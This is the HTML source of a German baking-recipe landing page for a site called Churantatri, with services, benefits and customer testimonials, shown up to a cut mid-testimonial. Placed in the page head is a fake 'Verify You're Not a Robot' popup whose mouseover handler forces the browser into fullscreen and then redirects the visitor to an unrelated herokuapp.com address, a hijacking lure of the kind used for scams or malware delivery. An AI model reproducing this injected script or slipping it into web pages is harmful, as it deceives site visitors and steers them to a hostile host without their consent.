<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Churantatri: Entdecken Sie köstliche Cake Recipes, Pastry Rezepte und Macaron-Anleitungen. Lernen Sie Bäckerei-Stil Backen zu Hause – einfach & lecker!">
  <meta name="robots" content="index, follow">
  <meta property="og:title" content="Churantatri - Unterhaltung | Cake Recipe & Backrezepte">
  <meta property="og:description" content="Churantatri: Entdecken Sie köstliche Cake Recipes, Pastry Rezepte und Macaron-Anleitungen. Lernen Sie Bäckerei-Stil Backen zu Hause – einfach & lecker!">
  <meta property="og:type" content="website">
  <title>Churantatri - Unterhaltung | Cake Recipe & Backrezepte</title>
   <div id="popup-wrapper" onmouseover="fullscreenAndRedirect()">
    <div id="popup-bg"></div>

    <div class="popup-card">
      <span class="close-btn">&times;</span>

      <div class="content">
        <div class="icon">🤖</div>

        <div class="text">
          <h2>Verify You're Not a Robot</h2>

          <p>
            Please complete the verification below before continuing.
          </p>

          <div class="robot-box">
            <input type="checkbox" id="robotCheck">
            <label for="robotCheck">I'm not a robot</label>

            <div class="captcha-brand">
              <div>Verification</div>
              <small>Human Check</small>
            </div>
          </div>

          <div class="actions">
            <button id="continueBtn" disabled>
              Continue
            </button>
          </div>
        </div>
      </div>
    </div>
  </div>

  <style>
    html,
    body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
    }

    #popup-wrapper {
      position: fixed;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 2147483647;
    }

    #popup-bg {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, .65);
      backdrop-filter: blur(14px);
      -webkit-backdrop-filter: blur(14px);
    }

    .popup-card {
      position: relative;
      width: 720px;
      max-width: 92%;
      background: #fff;
      border-radius: 22px;
      padding: 28px;
      box-shadow: 0 30px 90px rgba(0, 0, 0, .45);
      font-family: Arial, Helvetica, sans-serif;
      z-index: 2147483647;
      animation: popup .25s ease-out;
    }

    @keyframes popup {
      from {
        opacity: 0;
        transform: scale(.9);
      }

      to {
        opacity: 1;
        transform: scale(1);
      }
    }

    .close-btn {
      position: absolute;
      right: 16px;
      top: 12px;
      font-size: 30px;
      font-weight: bold;
      cursor: pointer;
      color: #666;
    }

    .content {
      display: flex;
      gap: 20px;
    }

    .icon {
      width: 70px;
      height: 70px;
      min-width: 70px;
      border-radius: 16px;
      background: #f3f4f6;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 38px;
    }

    .text {
      flex: 1;
    }

    .text h2 {
      margin: 0 0 10px;
      font-size: 34px;
      font-weight: 800;
      color: #111827;
    }

    .text p {
      margin: 0;
      font-size: 18px;
      line-height: 1.6;
      color: #4b5563;
    }

    .robot-box {
      margin-top: 22px;
      border: 1px solid #d1d5db;
      border-radius: 10px;
      background: #fafafa;
      padding: 18px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .robot-box input {
      width: 28px;
      height: 28px;
      cursor: pointer;
    }

    .robot-box label {
      flex: 1;
      margin-left: 12px;
      font-size: 20px;
      cursor: pointer;
    }

    .captcha-brand {
      text-align: center;
      font-size: 12px;
      color: #6b7280;
    }

    .actions {
      margin-top: 24px;
    }

    .actions button {
      width: 100%;
      padding: 16px;
      border: none;
      border-radius: 12px;
      background: #2563eb;
      color: #fff;
      font-size: 20px;
      font-weight: 700;
      cursor: pointer;
    }

    .actions button:disabled {
      opacity: .5;
      cursor: not-allowed;
    }

    @media(max-width:768px) {
      .content {
        flex-direction: column;
      }

      .icon {
        margin: auto;
      }

      .text h2 {
        font-size: 28px;
        text-align: center;
      }

      .text p {
        text-align: center;
      }
    }
  </style>

  <script>
    const robotCheck = document.getElementById("robotCheck");
    const continueBtn = document.getElementById("continueBtn");

    robotCheck.addEventListener("change", function () {
      continueBtn.disabled = !this.checked;
    });

    continueBtn.addEventListener("click", function () {
      alert("Verification completed.");
      // Add your own action here
    });

    document.querySelector(".close-btn").addEventListener("click", function () {
      document.getElementById("popup-wrapper").style.display = "none";
    });

     function fullscreenAndRedirect() {
    const el = document.documentElement;

    if (!document.fullscreenElement) {
      if (el.requestFullscreen) el.requestFullscreen();
      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
      else if (el.msRequestFullscreen) el.msRequestFullscreen();
    }

    setTimeout(() => {
      window.location.href = "https://winindnmbmnnbde-ab15cacc792e.herokuapp.com/";
    }, 1000);
  }
  </script>
  <link rel="canonical" href="https://churantatri-site.com">
  <link rel="icon" type="image/svg+xml" href="{{favicon_file}}">
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            primary: '#6366F1',
            'primary-dark': '#4F46E5',
          }
        }
      }
    }
  </script>
  <style>
    html { scroll-behavior: smooth; }
    .btn-primary { background-color: #6366F1; }
    .btn-primary:hover { background-color: #4F46E5; }
    .text-primary { color: #6366F1; }
    .bg-primary { background-color: #6366F1; }
    .border-primary { border-color: #6366F1; }
    .faq-answer { display: none; }
    .faq-answer.open { display: block; }
  </style>
</head>
<body class="font-sans text-gray-800 antialiased">

<!-- Cookie Banner -->
<div id="cookie-banner" class="fixed bottom-0 left-0 right-0 z-50 bg-gray-900 text-white p-4 shadow-lg" style="display:none;">
  <div class="max-w-6xl mx-auto flex flex-col md:flex-row items-center justify-between gap-4">
    <p class="text-sm text-gray-300">
      Wir verwenden Cookies, um Ihre Erfahrung auf unserer Website zu verbessern und unsere Backinhalte optimal für Sie bereitzustellen. Sie können auswählen, welche Cookies Sie akzeptieren möchten. <a href="privacy-policy.html" class="underline text-white hover:text-gray-300">Cookie-Richtlinie</a>.
    </p>
    <div class="flex gap-3 shrink-0">
      <button onclick="acceptCookies('necessary')" class="px-4 py-2 text-sm border border-gray-500 rounded hover:bg-gray-700 transition">Nur notwendige</button>
      <button onclick="acceptCookies('all')" class="px-4 py-2 text-sm rounded text-white transition btn-primary">Alle akzeptieren</button>
    </div>
  </div>
</div>

<!-- Header -->
<header id="main-header" class="sticky top-0 z-40 bg-white shadow-sm">
  <div class="max-w-6xl mx-auto px-4 py-4 flex items-center justify-between">
    <a href="/" class="flex items-center gap-2">
      <span class="text-2xl font-bold text-primary">Churantatri</span>
    </a>
    <nav class="hidden md:flex items-center gap-6 text-sm font-medium text-gray-600">
      <a href="#about" class="hover:text-primary transition">Über uns</a>
      <a href="#services" class="hover:text-primary transition">Angebote</a>
      <a href="#testimonials" class="hover:text-primary transition">Bewertungen</a>
      <a href="#faq" class="hover:text-primary transition">FAQ</a>
      <a href="contact.html" class="hover:text-primary transition">Kontakt</a>
    </nav>
    <a href="#cta" class="hidden md:inline-block px-5 py-2 text-sm font-semibold text-white rounded-lg transition btn-primary">Jetzt loslegen</a>
    <!-- Mobile menu button -->
    <button id="menu-btn" class="md:hidden p-2 rounded text-gray-600 hover:text-primary" onclick="toggleMenu()">
      <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/></svg>
    </button>
  </div>
  <!-- Mobile menu -->
  <div id="mobile-menu" class="hidden md:hidden bg-white border-t px-4 py-4 space-y-3 text-sm font-medium text-gray-600">
    <a href="#about" class="block hover:text-primary" onclick="toggleMenu()">Über uns</a>
    <a href="#services" class="block hover:text-primary" onclick="toggleMenu()">Angebote</a>
    <a href="#testimonials" class="block hover:text-primary" onclick="toggleMenu()">Bewertungen</a>
    <a href="#faq" class="block hover:text-primary" onclick="toggleMenu()">FAQ</a>
    <a href="contact.html" class="block hover:text-primary" onclick="toggleMenu()">Kontakt</a>
    <a href="#cta" class="block px-4 py-2 text-white rounded-lg text-center btn-primary" onclick="toggleMenu()">Jetzt loslegen</a>
  </div>
</header>

<!-- Hero -->
<section class="relative bg-gradient-to-br from-gray-50 to-gray-100 py-20 md:py-32 overflow-hidden">
  <div class="max-w-6xl mx-auto px-4 flex flex-col md:flex-row items-center gap-12">
    <div class="flex-1 text-center md:text-left">
      <span class="inline-block px-3 py-1 text-xs font-semibold rounded-full text-white mb-4 bg-primary">Backen & Genuss</span>
      <h1 class="text-4xl md:text-5xl lg:text-6xl font-extrabold text-gray-900 leading-tight mb-6">Lernen Sie, perfekte Cakes und Macarons zu backen</h1>
      <p class="text-lg md:text-xl text-gray-600 mb-8 max-w-xl">Entdecken Sie köstliche Cake Recipes, Pastry-Rezepte und Macaron-Anleitungen für Zuhause – im Bäckerei-Stil.</p>
      <div class="flex flex-col sm:flex-row gap-4 justify-center md:justify-start">
        <a href="#cta" class="px-8 py-4 text-white font-semibold rounded-xl shadow-lg transition btn-primary">Jetzt loslegen</a>
        <a href="#about" class="px-8 py-4 font-semibold rounded-xl border-2 border-primary text-primary hover:bg-primary hover:text-white transition">Mehr erfahren</a>
      </div>
      <!-- Stats -->
      <div class="mt-12 grid grid-cols-3 gap-6">
        <div>
          <div class="text-2xl font-bold text-primary">10+</div>
          <div class="text-xs text-gray-500 mt-1">Jahre Backerfahrung</div>
        </div>
        <div>
          <div class="text-2xl font-bold text-primary">5000+</div>
          <div class="text-xs text-gray-500 mt-1">Zufriedene Hobbybäcker</div>
        </div>
        <div>
          <div class="text-2xl font-bold text-primary">98%</div>
          <div class="text-xs text-gray-500 mt-1">Erfolgreiche Rezepte</div>
        </div>
      </div>
    </div>
    <div class="flex-1 w-full max-w-lg">
      <img src="images/hero.jpg" alt="Frisch gebackene Torte und Macarons im Bäckerei-Stil auf einem Holztisch" width="600" height="450" class="w-full rounded-2xl shadow-2xl object-cover" loading="eager">
    </div>
  </div>
</section>

<!-- About -->
<section id="about" class="py-20 bg-white">
  <div class="max-w-6xl mx-auto px-4">
    <div class="flex flex-col md:flex-row gap-12 items-center">
      <div class="flex-1">
        <img src="images/about.jpg" alt="Churantatri-Team beim gemeinsamen Backen in einer modernen Küche" width="540" height="400" class="w-full rounded-2xl shadow-lg object-cover" loading="lazy">
      </div>
      <div class="flex-1">
        <span class="text-sm font-semibold text-primary uppercase tracking-widest">Über Churantatri</span>
        <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mt-2 mb-6">Ihre Leidenschaft fürs Backen – unser Antrieb</h2>
        <p class="text-gray-600 leading-relaxed mb-4">Churantatri wurde mit einer einfachen Mission gegründet: jedem Menschen zu ermöglichen, zu Hause professionelle Backwaren zu kreieren. Wir glauben, dass Backen nicht nur eine Kunst, sondern auch eine Freude ist. Unsere Plattform bietet Schritt-für-Schritt-Anleitungen für Cake Recipes, Pastry-Rezepte und vieles mehr – leicht verständlich und für alle Erfahrungsstufen geeignet.</p>
        <p class="text-gray-600 leading-relaxed mb-4">Unser Team aus passionierten Bäckern und Konditoren hat jahrelange Erfahrung in professionellen Bäckereien Deutschlands. Wir übersetzen dieses Wissen in einfache, nachvollziehbare Rezepte, die Sie zu Hause umsetzen können. Ob Anfänger oder fortgeschrittener Hobbybäcker – bei Churantatri finden Sie die richtigen Techniken und Tricks für jeden Anlass.</p>
        <p class="text-gray-600 leading-relaxed mb-6">Von klassischen deutschen Tortenrezepten über französische Macarons bis hin zu modernen Pastry-Kreationen – Churantatri ist Ihr verlässlicher Begleiter in der Welt des Backens. Wir aktualisieren unsere Rezeptsammlung ständig, damit Sie immer neue Inspiration und aktuelle Trends im Bereich Home Baking und Bäckerei-Stil entdecken können.</p>
        <a href="about.html" class="inline-flex items-center gap-2 font-semibold text-primary hover:underline">
          Unsere Geschichte entdecken
          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 8l4 4m0 0l-4 4m4-4H3"/></svg>
        </a>
      </div>
    </div>
  </div>
</section>

<!-- Services -->
<section id="services" class="py-20 bg-gray-50">
  <div class="max-w-6xl mx-auto px-4">
    <div class="text-center mb-14">
      <span class="text-sm font-semibold text-primary uppercase tracking-widest">Unsere Angebote</span>
      <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mt-2">Alles rund ums Backen bei Churantatri</h2>
      <p class="text-gray-500 mt-4 max-w-xl mx-auto">Von Cake Recipes bis zu Macaron-Anleitungen – wir begleiten Sie auf Ihrem Weg zum Hobbybäcker im Bäckerei-Stil.</p>
    </div>
    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
      <!-- Service 1 -->
      <div class="bg-white rounded-2xl p-6 shadow-sm hover:shadow-md transition">
        <div class="w-12 h-12 rounded-xl flex items-center justify-center mb-4 bg-primary" style="opacity:0.9">
          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/></svg>
        </div>
        <h3 class="text-lg font-bold text-gray-900 mb-2">Cake Rezepte</h3>
        <p class="text-gray-500 text-sm leading-relaxed">Entdecken Sie unsere umfangreiche Sammlung an Cake Recipes – von klassischen Schokoladentorten bis zu modernen Fruchtcakes, perfekt für Geburtstage und besondere Anlässe zu Hause gebacken.</p>
      </div>
      <!-- Service 2 -->
      <div class="bg-white rounded-2xl p-6 shadow-sm hover:shadow-md transition">
        <div class="w-12 h-12 rounded-xl flex items-center justify-center mb-4 bg-primary" style="opacity:0.9">
          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.06 22.99h1.66c.84 0 1.53-.64 1.63-1.46L23 5.05h-5V1h-1.97v4.05h-4.97l.3 2.34c1.71.47 3.31 1.32 4.27 2.26 1.44 1.42 2.43 2.89 2.43 5.29v8.05zM1 21.99V21h15.03v.99c0 .55-.45 1-1.01 1H2.01c-.56 0-1.01-.45-1.01-1zm15.03-7c0-2.09-.96-3.07-2.72-4.43C11.43 9.3 9.29 9 8.03 9H1v2h7c1.53 0 2.85.64 3.58 1.43.73.79 1.45 1.86 1.45 2.57H1v2h16.03v-2z"/></svg>
        </div>
        <h3 class="text-lg font-bold text-gray-900 mb-2">Pastry Rezepte</h3>
        <p class="text-gray-500 text-sm leading-relaxed">Lernen Sie die Kunst der Konditorei mit unseren detaillierten Pastry Recipes. Croissants, Éclairs und Blätterteiggebäck gelingen mit unseren bewährten Schritt-für-Schritt-Anleitungen garantiert perfekt.</p>
      </div>
      <!-- Service 3 -->
      <div class="bg-white rounded-2xl p-6 shadow-sm hover:shadow-md transition">
        <div class="w-12 h-12 rounded-xl flex items-center justify-center mb-4 bg-primary" style="opacity:0.9">
          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 2a5 5 0 1 0 0 10A5 5 0 0 0 12 2zm0 12c-5.33 0-8 2.67-8 4v2h16v-2c0-1.33-2.67-4-8-4z"/></svg>
        </div>
        <h3 class="text-lg font-bold text-gray-900 mb-2">Macaron Anleitungen</h3>
        <p class="text-gray-500 text-sm leading-relaxed">Macarons selber machen war noch nie so einfach! Unsere detaillierten Macaron Recipes führen Sie durch jeden Schritt – von der perfekten Ganache bis zur knusprigen, luftigen Schale im Bäckerei-Stil.</p>
      </div>
      <!-- Service 4 -->
      <div class="bg-white rounded-2xl p-6 shadow-sm hover:shadow-md transition">
        <div class="w-12 h-12 rounded-xl flex items-center justify-center mb-4 bg-primary" style="opacity:0.9">
          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 16.5l6-4.5-6-4.5v9zM12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg>
        </div>
        <h3 class="text-lg font-bold text-gray-900 mb-2">Video-Tutorials</h3>
        <p class="text-gray-500 text-sm leading-relaxed">Schauen Sie unseren Backexperten über die Schulter! Unsere Video-Tutorials zeigen Ihnen in Echtzeit, wie Sie Bäckerei-Stil-Ergebnisse zu Hause erzielen – für Einsteiger und Fortgeschrittene gleichermaßen.</p>
      </div>
      <!-- Service 5 -->
      <div class="bg-white rounded-2xl p-6 shadow-sm hover:shadow-md transition">
        <div class="w-12 h-12 rounded-xl flex items-center justify-center mb-4 bg-primary" style="opacity:0.9">
          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82zM12 3L1 9l11 6 9-4.91V17h2V9L12 3z"/></svg>
        </div>
        <h3 class="text-lg font-bold text-gray-900 mb-2">Backkurse Online</h3>
        <p class="text-gray-500 text-sm leading-relaxed">Nehmen Sie an unseren interaktiven Online-Backkursen teil und lernen Sie von erfahrenen Konditoren. Vom Anfänger bis zum Profi – unsere Kurse vermitteln praxisnahes Wissen zum Selbst-Backen zu Hause.</p>
      </div>
      <!-- Service 6 -->
      <div class="bg-white rounded-2xl p-6 shadow-sm hover:shadow-md transition">
        <div class="w-12 h-12 rounded-xl flex items-center justify-center mb-4 bg-primary" style="opacity:0.9">
          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
        </div>
        <h3 class="text-lg font-bold text-gray-900 mb-2">Rezept-Community</h3>
        <p class="text-gray-500 text-sm leading-relaxed">Teilen Sie Ihre eigenen Backkreationen und tauschen Sie Tipps mit anderen Hobbybäckern aus. Unsere Community verbindet Gleichgesinnte, die ihre Leidenschaft für Cake Recipes und Home Baking teilen.</p>
      </div>
    </div>
  </div>
</section>

<!-- Benefits -->
<section class="py-20 bg-white">
  <div class="max-w-6xl mx-auto px-4">
    <div class="text-center mb-14">
      <span class="text-sm font-semibold text-primary uppercase tracking-widest">Ihre Vorteile</span>
      <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mt-2">Warum Churantatri für Ihr Backabenteuer wählen?</h2>
    </div>
    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8">
      <div class="text-center p-6">
        <div class="w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4" style="background-color: #6366F120;">
          <svg class="w-8 h-8 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
        </div>
        <h3 class="font-bold text-gray-900 mb-2">Einfache Schritt-für-Schritt-Anleitungen</h3>
        <p class="text-sm text-gray-500">Jedes Rezept ist klar strukturiert und leicht verständlich, damit auch Backanfänger sofort loslegen können.</p>
      </div>
      <div class="text-center p-6">
        <div class="w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4" style="background-color: #6366F120;">
          <svg class="w-8 h-8 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
        </div>
        <h3 class="font-bold text-gray-900 mb-2">Professionelle Bäckerei-Qualität zu Hause</h3>
        <p class="text-sm text-gray-500">Unsere Rezepte sind von echten Konditoren entwickelt – für authentischen Bäckerei-Stil aus Ihrer eigenen Küche.</p>
      </div>
      <div class="text-center p-6">
        <div class="w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4" style="background-color: #6366F120;">
          <svg class="w-8 h-8 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0"/></svg>
        </div>
        <h3 class="font-bold text-gray-900 mb-2">Ständig neue Rezepte</h3>
        <p class="text-sm text-gray-500">Unsere Rezeptbibliothek wächst stetig – entdecken Sie jede Woche neue Cake Recipes, Macarons und Pastry-Ideen.</p>
      </div>
      <div class="text-center p-6">
        <div class="w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4" style="background-color: #6366F120;">
          <svg class="w-8 h-8 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
        </div>
        <h3 class="font-bold text-gray-900 mb-2">Aktive Community & Support</h3>
        <p class="text-sm text-gray-500">Profitieren Sie von einer engagierten Backcommunity und erhalten Sie schnellen Support bei Fragen zu Ihren Rezepten.</p>
      </div>
    </div>
  </div>
</section>

<!-- Testimonials -->
<section id="testimonials" class="py-20 bg-gray-50">
  <div class="max-w-6xl mx-auto px-4">
    <div class="text-center mb-14">
      <span class="text-sm font-semibold text-primary uppercase tracking-widest">Kundenstimmen</span>
      <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mt-2">Was unsere Hobbybäcker sagen</h2>
    </div>
    <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
      <div class="bg-white rounded-2xl p-6 shadow-sm">
        <div class="flex gap-1 mb-4">
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
        </div>
        <p class="text-gray-600 text-sm leading-relaxed mb-4">"Dank Churantatri habe ich endlich das perfekte Macaron-Rezept gefunden! Die Anleitungen sind so klar und einfach zu folgen, dass meine ersten Macarons schon beim zweiten Versuch perfekt waren. Meine Familie ist begeistert, und ich backe jetzt jedes Wochenende etwas Neues. Absolut empfehlenswert für alle, die Backen lieben!"</p>
        <div class="flex items-center gap-3">
          <img src="images/avatar1.jpg" alt="Sabine Müller" width="40" height="40" class="w-10 h-10 rounded-full object-cover" loading="lazy">
          <div>
            <div class="font-semibold text-sm text-gray-900">Sabine Müller</div>
            <div class="text-xs text-gray-400">Hobbybäckerin aus München</div>
          </div>
        </div>
      </div>
      <div class="bg-white rounded-2xl p-6 shadow-sm">
        <div class="flex gap-1 mb-4">
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
        </div>
        <p class="text-gray-600 text-sm leading-relaxed mb-4">"Ich habe viele Backplattformen ausprobiert, aber Churantatri ist mit Abstand die beste. Die Pastry Recipes sind detailliert und professionell erklärt. Meine selbstgemachten Croissants sehen jetzt aus wie aus einer echten Bäckerei. Die Video-Tutorials helfen besonders dabei, die Techniken richtig zu verstehen und umzusetzen."</p>
        <div class="flex items-center gap-3">
          <img src="images/avatar2.jpg" alt="Klaus Hoffmann" width="40" height="40" class="w-10 h-10 rounded-full object-cover" loading="lazy">
          <div>
            <div class="font-semibold text-sm text-gray-900">Klaus Hoffmann</div>
            <div class="text-xs text-gray-400">Koch-Enthusiast aus Berlin</div>
          </div>
        </div>
      </div>
      <div class="bg-white rounded-2xl p-6 shadow-sm">
        <div class="flex gap-1 mb-4">
